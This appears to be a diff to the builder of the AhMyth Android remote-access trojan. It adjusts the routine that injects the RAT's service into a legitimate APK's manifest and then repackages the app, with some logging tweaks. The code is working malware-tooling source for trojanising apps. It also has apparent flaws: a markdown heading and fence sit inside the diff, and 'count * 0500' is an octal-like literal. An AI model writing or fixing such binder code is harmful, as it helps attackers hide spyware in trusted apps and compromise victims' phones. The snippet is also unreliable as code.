@@ -347,7 +347,7 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 
         delayedLog('[★] Modifying the Android Manifest File...\n');
         const ahmythService = CONSTANTS.ahmythService;
-        const permManifest = copyPermissions(data); //$appCtrl.copyPermissions(data);
+        const permManifest = $appCtrl.copyPermissions(data);
         const newManifest = permManifest.substring(0, permManifest.indexOf('</application>')) + ahmythService
         + permManifest.substring(permManifest.indexOf('</application>'));
         fs.writeFile(dir.join(apkFolder, 'AndroidManifest.xml'), newManifest, 'utf8', (error) => {
@@ -358,7 +358,7 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 
             xml2js.parseString(data, (err, result) => {
                 if (err) {
-                    console.error(err);
+                    delayedLog('[x] ' + err);
                     return;
                 }
 
@@ -454,7 +454,7 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 
                                                 return;
                                             }
-                                            $appCtrl.copyAhmythFilesAndGenerateApk
+                                            $appCtrl.CopyAhmythFilesAndGenerateApk(apkFolder);
                                         });
                                     });
                                 });
@@ -598,11 +598,11 @@ $appCtrl.BindOnLauncher = (apkFolder) => {
 ```
 ## New Functions
 ```js
-function delayedLog(message) {
+function delayedLog(msg, status) {
     let count = delayedLog.count = (delayedLog.count || 0) + 1;
     setTimeout(() => {
-        console.log(message);
-    }, count * 1000);
+        $appCtrl.Log(msg, status);
+    }, count * 0500);
 };
 
 function WriteErrorLog(errorMessage, errorType) {
